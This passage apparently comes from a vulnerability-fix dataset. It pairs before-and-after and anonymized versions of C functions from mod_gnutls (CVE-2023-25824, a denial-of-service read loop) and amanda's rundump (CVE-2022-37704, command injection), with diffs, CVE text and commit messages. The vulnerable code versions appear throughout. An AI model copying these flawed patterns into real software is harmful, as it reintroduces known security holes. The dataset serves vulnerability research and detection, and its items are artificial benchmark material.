            gnutls_transport_set_errno(ctxt->session, ETIMEDOUT);
            return -1;
        }

        if (rc != APR_SUCCESS)
        {
            /* Unexpected errors discard the brigade */
            ap_log_cerror(APLOG_MARK, APLOG_INFO, rc, ctxt->c,
                          ""%s: Unexpected error!"", __func__);
            apr_brigade_cleanup(ctxt->input_bb);
            ctxt->input_bb = NULL;
            gnutls_transport_set_errno(ctxt->session, EIO);
            return -1;
        }
    }

    ctxt->input_rc = brigade_consume(ctxt->input_bb, block, buffer, &len);

    if (ctxt->input_rc == APR_SUCCESS)
    {
        return (ssize_t) len;
    }

    if (APR_STATUS_IS_EAGAIN(ctxt->input_rc)
        || APR_STATUS_IS_EINTR(ctxt->input_rc))
    {
        if (len == 0)
        {
            gnutls_transport_set_errno(ctxt->session,
                                       EAI_APR_TO_RAW(ctxt->input_rc));
            return -1;
        }

        return (ssize_t) len;
    }

    /* Unexpected errors and APR_EOF clean out the brigade.
     * Subsequent calls will return APR_EOF. */
    apr_brigade_cleanup(ctxt->input_bb);
    ctxt->input_bb = NULL;

    if (APR_STATUS_IS_EOF(ctxt->input_rc) && len)
    {
        /* Some data has been received before EOF, return it. */
        return (ssize_t) len;
    }

    gnutls_transport_set_errno(ctxt->session, EIO);
    return -1;
}","ssize_t mgs_transport_read(gnutls_transport_ptr_t VAR_0,
                           void *VAR_1, size_t VAR_2)
{
    mgs_handle_t *VAR_3 = VAR_0;
    apr_size_t VAR_4 = VAR_2;
    apr_read_type_e VAR_5 = VAR_3->input_block;

    VAR_3->input_rc = VAR_6;

    /* COMMENT_0 */
    if (!VAR_2 || VAR_1 == NULL)
    {
        return 0;
    }
    /* COMMENT_1 */
    if (!VAR_3->input_bb)
    {
        VAR_3->input_rc = VAR_7;
        gnutls_transport_set_errno(VAR_3->session, VAR_8);
        return -1;
    }

    if (APR_BRIGADE_EMPTY(VAR_3->input_bb))
    {
        apr_status_t VAR_9 = ap_get_brigade(VAR_3->input_filter->next,
                                         VAR_3->input_bb, VAR_10,
                                         VAR_3->input_block, VAR_4);

        /* COMMENT_2 */
           
        if (APR_STATUS_IS_EAGAIN(VAR_9) || APR_STATUS_IS_EINTR(VAR_9)
            || (VAR_9 == VAR_6
                && APR_BRIGADE_EMPTY(VAR_3->input_bb)))
        {
            /* COMMENT_4 */
                                                                      
                                                           
            VAR_3->input_rc = (VAR_9 != VAR_6 ? VAR_9 : VAR_11);
            gnutls_transport_set_errno(VAR_3->session,
                                       EAI_APR_TO_RAW(VAR_3->input_rc));
            return -1;
        }

        /* COMMENT_7 */
                                                                  
                                                       
        if (VAR_3->input_block == VAR_12
            && APR_STATUS_IS_TIMEUP(VAR_9)
            && APR_BRIGADE_EMPTY(VAR_3->input_bb))
        {
            VAR_3->input_rc = VAR_9;
            gnutls_transport_set_errno(VAR_3->session, VAR_13);
            return -1;
        }

        if (VAR_9 != VAR_6)
        {
            /* COMMENT_10 */
            ap_log_cerror(VAR_14, VAR_15, VAR_9, VAR_3->c,
                          ""%s: Unexpected error!"", VAR_16);
            apr_brigade_cleanup(VAR_3->input_bb);
            VAR_3->input_bb = NULL;
            gnutls_transport_set_errno(VAR_3->session, VAR_17);
            return -1;
        }
    }

    VAR_3->input_rc = brigade_consume(VAR_3->input_bb, VAR_5, VAR_1, &VAR_2);

    if (VAR_3->input_rc == VAR_6)
    {
        return (ssize_t) VAR_2;
    }

    if (APR_STATUS_IS_EAGAIN(VAR_3->input_rc)
        || APR_STATUS_IS_EINTR(VAR_3->input_rc))
    {
        if (VAR_2 == 0)
        {
            gnutls_transport_set_errno(VAR_3->session,
                                       EAI_APR_TO_RAW(VAR_3->input_rc));
            return -1;
        }

        return (ssize_t) VAR_2;
    }

    /* COMMENT_11 */
                                               
    apr_brigade_cleanup(VAR_3->input_bb);
    VAR_3->input_bb = NULL;

    if (APR_STATUS_IS_EOF(VAR_3->input_rc) && VAR_2)
    {
        /* COMMENT_13 */
        return (ssize_t) VAR_2;
    }

    gnutls_transport_set_errno(VAR_3->session, VAR_17);
    return -1;
}",airtower-luna/mod_gnutls/d7eec4e598158ab6a98bf505354e84352f9715ec/gnutls_io.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -49,7 +49,7 @@
             && APR_BRIGADE_EMPTY(ctxt->input_bb))
         {
             ctxt->input_rc = rc;
-            gnutls_transport_set_errno(ctxt->session, EAGAIN);
+            gnutls_transport_set_errno(ctxt->session, ETIMEDOUT);
             return -1;
         }
 ","{'deleted_lines': ['            gnutls_transport_set_errno(ctxt->session, EAGAIN);'], 'added_lines': ['            gnutls_transport_set_errno(ctxt->session, ETIMEDOUT);']}",True,"Mod_gnutls is a TLS module for Apache HTTPD based on GnuTLS. Versions from 0.9.0 to 0.12.0 (including) did not properly fail blocking read operations on TLS connections when the transport hit timeouts. Instead it entered an endless loop retrying the read operation, consuming CPU resources. This could be exploited for denial of service attacks. If trace level logging was enabled, it would also produce an excessive amount of log output during the loop, consuming disk space. The problem has been fixed in commit d7eec4e598158ab6a98bf505354e84352f9715ec, please update to version 0.12.1. There are no workarounds, users who cannot update should apply the errno fix detailed in the security advisory. 
",7.5,HIGH,2,valid,2023-02-23T10:55:53Z,4
CVE-2023-25824,['CWE-835'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,airtower-luna/mod_gnutls,"Fix loop in blocking read on transport timeout

The loop was cased by an incorrect errno if the transport read in
mgs_transport_read() fails with an APR TIMEUP status, as happens when
mod_reqtimeout limits are exceeded. Setting the transport errno to
EGAIN meant that a blocking read would be retried endlessly, setting
ETIMEDOUT instead makes the read fail as it should.

The bug was introduced in commit 92cb0cca41af946055307e373b6ab6d76d34f356,
first release to include it was 0.9.0.

Many thanks to Flix Arreola Rodrguez for the detailed analysis [1]
on the Debian bug tracker!

[1] https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=942737#25",d7eec4e598158ab6a98bf505354e84352f9715ec,https://github.com/airtower-luna/mod_gnutls/commit/d7eec4e598158ab6a98bf505354e84352f9715ec,src/gnutls_io.c,gnutls_io_input_read,"static apr_status_t gnutls_io_input_read(mgs_handle_t * ctxt,
char *buf, apr_size_t * len)
{
apr_size_t wanted = *len;
apr_size_t bytes = 0;
*len = 0;
if ((bytes = char_buffer_read(&ctxt->input_cbuf, buf, wanted))) {
*len = bytes;
if (ctxt->input_mode == AP_MODE_SPECULATIVE) {
if (ctxt->input_cbuf.length > 0) {
ctxt->input_cbuf.value -= bytes;
ctxt->input_cbuf.length += bytes;
} else {
char_buffer_write(&ctxt->input_cbuf, buf,
(int) bytes);
}
return APR_SUCCESS;
}
if (*len >= wanted) {
return APR_SUCCESS;
}
if (ctxt->input_mode == AP_MODE_GETLINE) {
if (memchr(buf, APR_ASCII_LF, *len)) {
return APR_SUCCESS;
}
} else {
ctxt->input_block = APR_NONBLOCK_READ;
}
}
if (ctxt->session == NULL) {
ap_log_cerror(APLOG_MARK, APLOG_INFO, 0, ctxt->c,
""%s: GnuTLS session is NULL!"", __func__);
return APR_EGENERAL;
}
while (1)
{
int rc = gnutls_record_recv(ctxt->session,
buf + bytes, wanted - bytes);
if (rc > 0) {
*len += rc;
if (ctxt->input_mode == AP_MODE_SPECULATIVE) {
char_buffer_write(&ctxt->input_cbuf, buf,
*len);
}
return ctxt->input_rc;
} else if (rc == 0) {
if (*len > 0) {
ctxt->input_rc = APR_SUCCESS;
} else {
ctxt->input_rc = APR_EOF;
}
break;
} else { 
if (rc == GNUTLS_E_INTERRUPTED || rc == GNUTLS_E_AGAIN)
{
ap_log_cerror(APLOG_MARK, APLOG_TRACE2, ctxt->input_rc, ctxt->c,
""%s: looping recv after '%s' (%d)"",
__func__, gnutls_strerror(rc), rc);
if (ctxt->input_block != APR_NONBLOCK_READ)
continue;
else
ctxt->input_rc =
(rc == GNUTLS_E_AGAIN ? APR_EAGAIN : APR_EINTR);
} else if (rc == GNUTLS_E_REHANDSHAKE) {
ap_log_cerror(APLOG_MARK, APLOG_DEBUG,
ctxt->input_rc,
ctxt->c,
""GnuTLS: Error reading data. Client Requested a New Handshake.""
"" (%d) '%s'"", rc,
gnutls_strerror(rc));
} else if (rc == GNUTLS_E_WARNING_ALERT_RECEIVED) {
rc = gnutls_alert_get(ctxt->session);
ap_log_cerror(APLOG_MARK, APLOG_DEBUG,
ctxt->input_rc,
ctxt->c,
""GnuTLS: Warning Alert From Client: ""
"" (%d) '%s'"", rc,
gnutls_alert_get_name(rc));
} else if (rc == GNUTLS_E_FATAL_ALERT_RECEIVED) {
rc = gnutls_alert_get(ctxt->session);
ap_log_cerror(APLOG_MARK, APLOG_DEBUG,
ctxt->input_rc,
ctxt->c,
""GnuTLS: Fatal Alert From Client: ""
""(%d) '%s'"", rc,
gnutls_alert_get_name(rc));
ctxt->input_rc = APR_EGENERAL;
break;
} else {
if (gnutls_error_is_fatal(rc)) {
ap_log_cerror(
APLOG_MARK, APLOG_DEBUG,
ctxt->input_rc,
ctxt->c,
""GnuTLS: Error reading data. (%d) '%s'"",
rc, gnutls_strerror(rc));
} else if (*len > 0) {
ctxt->input_rc = APR_SUCCESS;
break;
}
}
if (ctxt->input_rc == APR_SUCCESS) {
ap_log_cerror(APLOG_MARK, APLOG_INFO, ctxt->input_rc, ctxt->c,
""%s: GnuTLS error: %s (%d)"",
__func__, gnutls_strerror(rc), rc);
ctxt->input_rc = APR_EGENERAL;
}
break;
}
}
return ctxt->input_rc;
}","static apr_status_t gnutls_io_input_read(mgs_handle_t * VAR_0,
char *VAR_1, apr_size_t * VAR_2)
{
apr_size_t VAR_3 = *VAR_2;
apr_size_t VAR_4 = 0;
*VAR_2 = 0;
if ((VAR_4 = char_buffer_read(&VAR_0->input_cbuf, VAR_1, VAR_3))) {
*VAR_2 = VAR_4;
if (VAR_0->input_mode == VAR_5) {
if (VAR_0->input_cbuf.length > 0) {
VAR_0->input_cbuf.value -= VAR_4;
VAR_0->input_cbuf.length += VAR_4;
} else {
char_buffer_write(&VAR_0->input_cbuf, VAR_1,
(int) VAR_4);
}
return VAR_6;
}
if (*VAR_2 >= VAR_3) {
return VAR_6;
}
if (VAR_0->input_mode == VAR_7) {
if (memchr(VAR_1, VAR_8, *VAR_2)) {
return VAR_6;
}
} else {
VAR_0->input_block = VAR_9;
}
}
if (VAR_0->session == NULL) {
ap_log_cerror(VAR_10, VAR_11, 0, VAR_0->c,
""%s: GnuTLS session is NULL!"", VAR_12);
return VAR_13;
}
while (1)
{
int VAR_14 = gnutls_record_recv(VAR_0->session,
VAR_1 + VAR_4, VAR_3 - VAR_4);
if (VAR_14 > 0) {
*VAR_2 += VAR_14;
if (VAR_0->input_mode == VAR_5) {
char_buffer_write(&VAR_0->input_cbuf, VAR_1,
*VAR_2);
}
return VAR_0->input_rc;
} else if (VAR_14 == 0) {
if (*VAR_2 > 0) {
VAR_0->input_rc = VAR_6;
} else {
VAR_0->input_rc = VAR_15;
}
break;
} else { 
if (VAR_14 == VAR_16 || VAR_14 == VAR_17)
{
ap_log_cerror(VAR_10, VAR_18, VAR_0->input_rc, VAR_0->c,
""%s: looping recv after '%s' (%d)"",
VAR_12, gnutls_strerror(VAR_14), VAR_14);
if (VAR_0->input_block != VAR_9)
continue;
else
VAR_0->input_rc =
(VAR_14 == VAR_17 ? VAR_19 : VAR_20);
} else if (VAR_14 == VAR_21) {
ap_log_cerror(VAR_10, VAR_22,
VAR_0->input_rc,
VAR_0->c,
""GnuTLS: Error reading data. Client Requested a New Handshake.""
"" (%d) '%s'"", VAR_14,
gnutls_strerror(VAR_14));
} else if (VAR_14 == VAR_23) {
VAR_14 = gnutls_alert_get(VAR_0->session);
ap_log_cerror(VAR_10, VAR_22,
VAR_0->input_rc,
VAR_0->c,
""GnuTLS: Warning Alert From Client: ""
"" (%d) '%s'"", VAR_14,
gnutls_alert_get_name(VAR_14));
} else if (VAR_14 == VAR_24) {
VAR_14 = gnutls_alert_get(VAR_0->session);
ap_log_cerror(VAR_10, VAR_22,
VAR_0->input_rc,
VAR_0->c,
""GnuTLS: Fatal Alert From Client: ""
""(%d) '%s'"", VAR_14,
gnutls_alert_get_name(VAR_14));
VAR_0->input_rc = VAR_13;
break;
} else {
if (gnutls_error_is_fatal(VAR_14)) {
ap_log_cerror(
VAR_10, VAR_22,
VAR_0->input_rc,
VAR_0->c,
""GnuTLS: Error reading data. (%d) '%s'"",
VAR_14, gnutls_strerror(VAR_14));
} else if (*VAR_2 > 0) {
VAR_0->input_rc = VAR_6;
break;
}
}
if (VAR_0->input_rc == VAR_6) {
ap_log_cerror(VAR_10, VAR_11, VAR_0->input_rc, VAR_0->c,
""%s: GnuTLS error: %s (%d)"",
VAR_12, gnutls_strerror(VAR_14), VAR_14);
VAR_0->input_rc = VAR_13;
}
break;
}
}
return VAR_0->input_rc;
}",airtower-luna/mod_gnutls/d7eec4e598158ab6a98bf505354e84352f9715ec/gnutls_io.c/vul/before/1.json,"static apr_status_t gnutls_io_input_read(mgs_handle_t * ctxt,
        char *buf, apr_size_t * len)
{
    apr_size_t wanted = *len;
    apr_size_t bytes = 0;

    *len = 0;

    /* If we have something leftover from last time, try that first. */
    if ((bytes = char_buffer_read(&ctxt->input_cbuf, buf, wanted))) {
        *len = bytes;
        if (ctxt->input_mode == AP_MODE_SPECULATIVE) {
            /* We want to rollback this read. */
            if (ctxt->input_cbuf.length > 0) {
                ctxt->input_cbuf.value -= bytes;
                ctxt->input_cbuf.length += bytes;
            } else {
                char_buffer_write(&ctxt->input_cbuf, buf,
                        (int) bytes);
            }
            return APR_SUCCESS;
        }
        /* This could probably be *len == wanted, but be safe from stray
         * photons.
         */
        if (*len >= wanted) {
            return APR_SUCCESS;
        }
        if (ctxt->input_mode == AP_MODE_GETLINE) {
            if (memchr(buf, APR_ASCII_LF, *len)) {
                return APR_SUCCESS;
            }
        } else {
            /* Down to a nonblock pattern as we have some data already
             */
            ctxt->input_block = APR_NONBLOCK_READ;
        }
    }

    if (ctxt->session == NULL) {
        ap_log_cerror(APLOG_MARK, APLOG_INFO, 0, ctxt->c,
                      ""%s: GnuTLS session is NULL!"", __func__);
        return APR_EGENERAL;
    }

    while (1)
    {
        /* Note: The pull function sets ctxt->input_rc */
        int rc = gnutls_record_recv(ctxt->session,
                                    buf + bytes, wanted - bytes);

        if (rc > 0) {
            *len += rc;
            if (ctxt->input_mode == AP_MODE_SPECULATIVE) {
                /* We want to rollback this read. */
                char_buffer_write(&ctxt->input_cbuf, buf,
                                  *len);
            }
            return ctxt->input_rc;
        } else if (rc == 0) {
            /* EOF, return code depends on whether we still have data
             * to return. */
            if (*len > 0) {
                ctxt->input_rc = APR_SUCCESS;
            } else {
                ctxt->input_rc = APR_EOF;
            }
            break;
        } else { /* (rc < 0) */

            if (rc == GNUTLS_E_INTERRUPTED || rc == GNUTLS_E_AGAIN)
            {
                ap_log_cerror(APLOG_MARK, APLOG_TRACE2, ctxt->input_rc, ctxt->c,
                              ""%s: looping recv after '%s' (%d)"",
                              __func__, gnutls_strerror(rc), rc);
                /* For a blocking read, loop and try again
                 * immediately. Otherwise just notify the caller. */
                if (ctxt->input_block != APR_NONBLOCK_READ)
                    continue;
                else
                    ctxt->input_rc =
                        (rc == GNUTLS_E_AGAIN ? APR_EAGAIN : APR_EINTR);
            } else if (rc == GNUTLS_E_REHANDSHAKE) {
                /* A client has asked for a new Hankshake. Currently, we don't do it */
                ap_log_cerror(APLOG_MARK, APLOG_DEBUG,
                        ctxt->input_rc,
                        ctxt->c,
                        ""GnuTLS: Error reading data. Client Requested a New Handshake.""
                        "" (%d) '%s'"", rc,
                        gnutls_strerror(rc));
            } else if (rc == GNUTLS_E_WARNING_ALERT_RECEIVED) {
                rc = gnutls_alert_get(ctxt->session);
                ap_log_cerror(APLOG_MARK, APLOG_DEBUG,
                        ctxt->input_rc,
                        ctxt->c,
                        ""GnuTLS: Warning Alert From Client: ""
                        "" (%d) '%s'"", rc,
                        gnutls_alert_get_name(rc));
            } else if (rc == GNUTLS_E_FATAL_ALERT_RECEIVED) {
                rc = gnutls_alert_get(ctxt->session);
                ap_log_cerror(APLOG_MARK, APLOG_DEBUG,
                        ctxt->input_rc,
                        ctxt->c,
                        ""GnuTLS: Fatal Alert From Client: ""
                        ""(%d) '%s'"", rc,
                        gnutls_alert_get_name(rc));
                ctxt->input_rc = APR_EGENERAL;
                break;
            } else if (rc == GNUTLS_E_PULL_ERROR
                       && APR_STATUS_IS_TIMEUP(ctxt->input_rc)) {
                ap_log_cerror(
                    APLOG_MARK, APLOG_TRACE2, ctxt->input_rc, ctxt->c,
                    ""%s: transport read timed out"", __func__);
            } else {
                /* Some Other Error. Report it. Die. */
                if (gnutls_error_is_fatal(rc)) {
                    ap_log_cerror(
                        APLOG_MARK, APLOG_DEBUG,
                        ctxt->input_rc,
                        ctxt->c,
                        ""GnuTLS: Error reading data. (%d) '%s'"",
                        rc, gnutls_strerror(rc));
                } else if (*len > 0) {
                    ctxt->input_rc = APR_SUCCESS;
                    break;
                }
            }

            if (ctxt->input_rc == APR_SUCCESS) {
                ap_log_cerror(APLOG_MARK, APLOG_INFO, ctxt->input_rc, ctxt->c,
                              ""%s: GnuTLS error: %s (%d)"",
                              __func__, gnutls_strerror(rc), rc);
                ctxt->input_rc = APR_EGENERAL;
            }
            break;
        }
    }
    return ctxt->input_rc;
}","static apr_status_t gnutls_io_input_read(mgs_handle_t * VAR_0,
        char *VAR_1, apr_size_t * VAR_2)
{
    apr_size_t VAR_3 = *VAR_2;
    apr_size_t VAR_4 = 0;

    *VAR_2 = 0;

    /* COMMENT_0 */
    if ((VAR_4 = char_buffer_read(&VAR_0->input_cbuf, VAR_1, VAR_3))) {
        *VAR_2 = VAR_4;
        if (VAR_0->input_mode == VAR_5) {
            /* COMMENT_1 */
            if (VAR_0->input_cbuf.length > 0) {
                VAR_0->input_cbuf.value -= VAR_4;
                VAR_0->input_cbuf.length += VAR_4;
            } else {
                char_buffer_write(&VAR_0->input_cbuf, VAR_1,
                        (int) VAR_4);
            }
            return VAR_6;
        }
        /* COMMENT_2 */
                   
           
        if (*VAR_2 >= VAR_3) {
            return VAR_6;
        }
        if (VAR_0->input_mode == VAR_7) {
            if (memchr(VAR_1, VAR_8, *VAR_2)) {
                return VAR_6;
            }
        } else {
            /* COMMENT_5 */
               
            VAR_0->input_block = VAR_9;
        }
    }

    if (VAR_0->session == NULL) {
        ap_log_cerror(VAR_10, VAR_11, 0, VAR_0->c,
                      ""%s: GnuTLS session is NULL!"", VAR_12);
        return VAR_13;
    }

    while (1)
    {
        /* COMMENT_7 */
        int VAR_14 = gnutls_record_recv(VAR_0->session,
                                    VAR_1 + VAR_4, VAR_3 - VAR_4);

        if (VAR_14 > 0) {
            *VAR_2 += VAR_14;
            if (VAR_0->input_mode == VAR_5) {
                /* COMMENT_1 */
                char_buffer_write(&VAR_0->input_cbuf, VAR_1,
                                  *VAR_2);
            }
            return VAR_0->input_rc;
        } else if (VAR_14 == 0) {
            /* COMMENT_8 */
                            
            if (*VAR_2 > 0) {
                VAR_0->input_rc = VAR_6;
            } else {
                VAR_0->input_rc = VAR_15;
            }
            break;
        } else { /* COMMENT_10 */

            if (VAR_14 == VAR_16 || VAR_14 == VAR_17)
            {
                ap_log_cerror(VAR_10, VAR_18, VAR_0->input_rc, VAR_0->c,
                              ""%s: looping recv after '%s' (%d)"",
                              VAR_12, gnutls_strerror(VAR_14), VAR_14);
                /* COMMENT_11 */
                                                                    
                if (VAR_0->input_block != VAR_9)
                    continue;
                else
                    VAR_0->input_rc =
                        (VAR_14 == VAR_17 ? VAR_19 : VAR_20);
            } else if (VAR_14 == VAR_21) {
                /* COMMENT_13 */
                ap_log_cerror(VAR_10, VAR_22,
                        VAR_0->input_rc,
                        VAR_0->c,
                        ""GnuTLS: Error reading data. Client Requested a New Handshake.""
                        "" (%d) '%s'"", VAR_14,
                        gnutls_strerror(VAR_14));
            } else if (VAR_14 == VAR_23) {
                VAR_14 = gnutls_alert_get(VAR_0->session);
                ap_log_cerror(VAR_10, VAR_22,
                        VAR_0->input_rc,
                        VAR_0->c,
                        ""GnuTLS: Warning Alert From Client: ""
                        "" (%d) '%s'"", VAR_14,
                        gnutls_alert_get_name(VAR_14));
            } else if (VAR_14 == VAR_24) {
                VAR_14 = gnutls_alert_get(VAR_0->session);
                ap_log_cerror(VAR_10, VAR_22,
                        VAR_0->input_rc,
                        VAR_0->c,
                        ""GnuTLS: Fatal Alert From Client: ""
                        ""(%d) '%s'"", VAR_14,
                        gnutls_alert_get_name(VAR_14));
                VAR_0->input_rc = VAR_13;
                break;
            } else if (VAR_14 == VAR_25
                       && APR_STATUS_IS_TIMEUP(VAR_0->input_rc)) {
                ap_log_cerror(
                    VAR_10, VAR_18, VAR_0->input_rc, VAR_0->c,
                    ""%s: transport read timed out"", VAR_12);
            } else {
                /* COMMENT_14 */
                if (gnutls_error_is_fatal(VAR_14)) {
                    ap_log_cerror(
                        VAR_10, VAR_22,
                        VAR_0->input_rc,
                        VAR_0->c,
                        ""GnuTLS: Error reading data. (%d) '%s'"",
                        VAR_14, gnutls_strerror(VAR_14));
                } else if (*VAR_2 > 0) {
                    VAR_0->input_rc = VAR_6;
                    break;
                }
            }

            if (VAR_0->input_rc == VAR_6) {
                ap_log_cerror(VAR_10, VAR_11, VAR_0->input_rc, VAR_0->c,
                              ""%s: GnuTLS error: %s (%d)"",
                              VAR_12, gnutls_strerror(VAR_14), VAR_14);
                VAR_0->input_rc = VAR_13;
            }
            break;
        }
    }
    return VAR_0->input_rc;
}",airtower-luna/mod_gnutls/d7eec4e598158ab6a98bf505354e84352f9715ec/gnutls_io.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -106,6 +106,11 @@
                         gnutls_alert_get_name(rc));
                 ctxt->input_rc = APR_EGENERAL;
                 break;
+            } else if (rc == GNUTLS_E_PULL_ERROR
+                       && APR_STATUS_IS_TIMEUP(ctxt->input_rc)) {
+                ap_log_cerror(
+                    APLOG_MARK, APLOG_TRACE2, ctxt->input_rc, ctxt->c,
+                    ""%s: transport read timed out"", __func__);
             } else {
                 /* Some Other Error. Report it. Die. */
                 if (gnutls_error_is_fatal(rc)) {","{'deleted_lines': [], 'added_lines': ['            } else if (rc == GNUTLS_E_PULL_ERROR', '                       && APR_STATUS_IS_TIMEUP(ctxt->input_rc)) {', '                ap_log_cerror(', '                    APLOG_MARK, APLOG_TRACE2, ctxt->input_rc, ctxt->c,', '                    ""%s: transport read timed out"", __func__);']}",True,"Mod_gnutls is a TLS module for Apache HTTPD based on GnuTLS. Versions from 0.9.0 to 0.12.0 (including) did not properly fail blocking read operations on TLS connections when the transport hit timeouts. Instead it entered an endless loop retrying the read operation, consuming CPU resources. This could be exploited for denial of service attacks. If trace level logging was enabled, it would also produce an excessive amount of log output during the loop, consuming disk space. The problem has been fixed in commit d7eec4e598158ab6a98bf505354e84352f9715ec, please update to version 0.12.1. There are no workarounds, users who cannot update should apply the errno fix detailed in the security advisory. 
",7.5,HIGH,2,valid,2023-02-23T10:55:53Z,4
CVE-2022-37704,['CWE-77'],CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H,1,zmanda/amanda,"Update the fix for CVE-2022-37704

In the case of xfsdump(8), the check for dump(8) options was invoked
instead of the check for the xfsdump(8). This broke legitimate use of
xfsdump, while leaving the vulnerability open.",b930189c06290a23aba177687b2f123590323be1,https://github.com/zmanda/amanda/commit/b930189c06290a23aba177687b2f123590323be1,client-src/rundump.c,main,"int
main(
intargc,
char **argv)
{
#ifndef ERRMSG
char *dump_program;
int i;
char *e;
char *cmdline;
GPtrArray *array = g_ptr_array_new();
gchar **strings;
char  **env;
#endif 
glib_init();
if (argc > 1 && argv[1] && g_str_equal(argv[1], ""--version"")) {
printf(""rundump-%s\n"", VERSION);
return (0);
}
setlocale(LC_MESSAGES, ""C"");
textdomain(""amanda""); 
safe_fd(-1, 0);
safe_cd();
set_pname(""rundump"");
signal(SIGPIPE, SIG_IGN);
dbopen(DBG_SUBDIR_CLIENT);
config_init(CONFIG_INIT_CLIENT|CONFIG_INIT_GLOBAL, NULL);
if (argc < 3) {
error(_(""Need at least 3 arguments\n""));
}
dbprintf(_(""version %s\n""), VERSION);
#ifdef ERRMSG
g_fprintf(stderr, ERRMSG);
dbprintf(""%s: %s"", argv[0], ERRMSG);
dbclose();
return 1;
#else
#ifdef WANT_SETUID_CLIENT
check_running_as(RUNNING_AS_CLIENT_LOGIN | RUNNING_AS_UID_ONLY);
if (!become_root()) {
error(_(""error [%s could not become root (is the setuid bit set?)]\n""), get_pname());
}
#else
check_running_as(RUNNING_AS_CLIENT_LOGIN);
#endif
argc--;
argv++;
dbprintf(_(""config: %s\n""), argv[0]);
if (!g_str_equal(argv[0], ""NOCONFIG""))
dbrename(argv[0], DBG_SUBDIR_CLIENT);
argc--;
argv++;
#ifdef XFSDUMP
if (g_str_equal(argv[0], ""xfsdump""))
dump_program = XFSDUMP;
else 
#endif
#ifdef VXDUMP
if (g_str_equal(argv[0], ""vxdump""))
dump_program = VXDUMP;
else 
#endif
#ifdef VDUMP
if (g_str_equal(argv[0], ""vdump""))
dump_program = VDUMP;
else 
#endif
#if defined(DUMP)
dump_program = DUMP;
validate_dump_option(argc, argv);
#else
# if defined(XFSDUMP)
dump_program = XFSDUMP;
validate_xfsdump_options(argc, argv);
# else
#  if defined(VXDUMP)
dump_program = VXDUMP;
#  else
dump_program = ""dump"";
validate_dump_option(argc, argv);
#  endif
# endif
#endif
g_ptr_array_add(array, g_strdup(dump_program));
for (i = 1; argv[i]; i++)
g_ptr_array_add(array, quote_string(argv[i]));
g_ptr_array_add(array, NULL);
strings = (gchar **)g_ptr_array_free(array, FALSE);
cmdline = g_strjoinv("" "", strings);
g_strfreev(strings);
dbprintf(_(""running: %s\n""), cmdline);
amfree(cmdline);
env = safe_env();
int env_count = 0;
for (int i = 0; env[i] != NULL; i++){
env_count++;
}
for (int i = 0; i < env_count; i++){
if (strncmp(env[i], ""RSH="", 4) == 0){
g_free(env[i]);
for (int j = i; j < env_count; j++){
env[j] = env[j + 1];
}
env[env_count-1] = NULL;
break;
}
}
execve(dump_program, argv, env);
free_env(env);
e = strerror(errno);
dbprintf(_(""failed (%s)\n""), e);
dbclose();
g_fprintf(stderr, _(""rundump: could not exec %s: %s\n""), dump_program, e);
return 1;
#endif
}","int
main(
intVAR_0,
char **VAR_1)
{
#ifndef VAR_2
char *VAR_3;
int VAR_4;
char *VAR_5;
char *VAR_6;
GPtrArray *VAR_7 = g_ptr_array_new();
gchar **VAR_8;
char  **VAR_9;
#endif 
glib_init();
if (VAR_0 > 1 && VAR_1[1] && g_str_equal(VAR_1[1], ""--version"")) {
printf(""rundump-%s\n"", VAR_10);
return (0);
}
setlocale(VAR_11, ""C"");
textdomain(""amanda""); 
safe_fd(-1, 0);
safe_cd();
set_pname(""rundump"");
signal(VAR_12, VAR_13);
dbopen(VAR_14);
config_init(VAR_15|VAR_16, NULL);
if (VAR_0 < 3) {
error(_(""Need at least 3 arguments\n""));
}
dbprintf(_(""version %s\n""), VAR_10);
#ifdef VAR_2
g_fprintf(VAR_17, VAR_2);
dbprintf(""%s: %s"", VAR_1[0], VAR_2);
dbclose();
return 1;
#else
#ifdef VAR_18
check_running_as(VAR_19 | VAR_20);
if (!become_root()) {
error(_(""error [%s could not become root (is the setuid bit set?)]\n""), get_pname());
}
#else
check_running_as(VAR_19);
#endif
VAR_0--;
VAR_1++;
dbprintf(_(""config: %s\n""), VAR_1[0]);
if (!g_str_equal(VAR_1[0], ""NOCONFIG""))
dbrename(VAR_1[0], VAR_14);
VAR_0--;
VAR_1++;
#ifdef VAR_21
if (g_str_equal(VAR_1[0], ""xfsdump""))
VAR_3 = VAR_21;
else 
#endif
#ifdef VAR_22
if (g_str_equal(VAR_1[0], ""vxdump""))
VAR_3 = VAR_22;
else 
#endif
#ifdef VAR_23
if (g_str_equal(VAR_1[0], ""vdump""))
VAR_3 = VAR_23;
else 
#endif
#if defined(VAR_24)
VAR_3 = VAR_24;
validate_dump_option(VAR_0, VAR_1);
#else
# if defined(VAR_21)
VAR_3 = VAR_21;
validate_xfsdump_options(VAR_0, VAR_1);
# else
#  if defined(VAR_22)
VAR_3 = VAR_22;
#  else
VAR_3 = ""dump"";
validate_dump_option(VAR_0, VAR_1);
#  endif
# endif
#endif
g_ptr_array_add(VAR_7, g_strdup(VAR_3));
for (VAR_4 = 1; VAR_1[VAR_4]; VAR_4++)
g_ptr_array_add(VAR_7, quote_string(VAR_1[VAR_4]));
g_ptr_array_add(VAR_7, NULL);
VAR_8 = (gchar **)g_ptr_array_free(VAR_7, FALSE);
VAR_6 = g_strjoinv("" "", VAR_8);
g_strfreev(VAR_8);
dbprintf(_(""running: %s\n""), VAR_6);
amfree(VAR_6);
VAR_9 = safe_env();
int VAR_25 = 0;
for (int VAR_4 = 0; VAR_9[VAR_4] != NULL; VAR_4++){
VAR_25++;
}
for (int VAR_4 = 0; VAR_4 < VAR_25; VAR_4++){
if (strncmp(VAR_9[VAR_4], ""RSH="", 4) == 0){
g_free(VAR_9[VAR_4]);
for (int VAR_26 = VAR_4; VAR_26 < VAR_25; VAR_26++){
VAR_9[VAR_26] = VAR_9[VAR_26 + 1];
}
VAR_9[VAR_25-1] = NULL;
break;
}
}
execve(VAR_3, VAR_1, VAR_9);
free_env(VAR_9);
VAR_5 = strerror(VAR_27);
dbprintf(_(""failed (%s)\n""), VAR_5);
dbclose();
g_fprintf(VAR_17, _(""rundump: could not exec %s: %s\n""), VAR_3, VAR_5);
return 1;
#endif
}",zmanda/amanda/b930189c06290a23aba177687b2f123590323be1/rundump.c/vul/before/0.json,"int
main(
    int		argc,
    char **	argv)
{
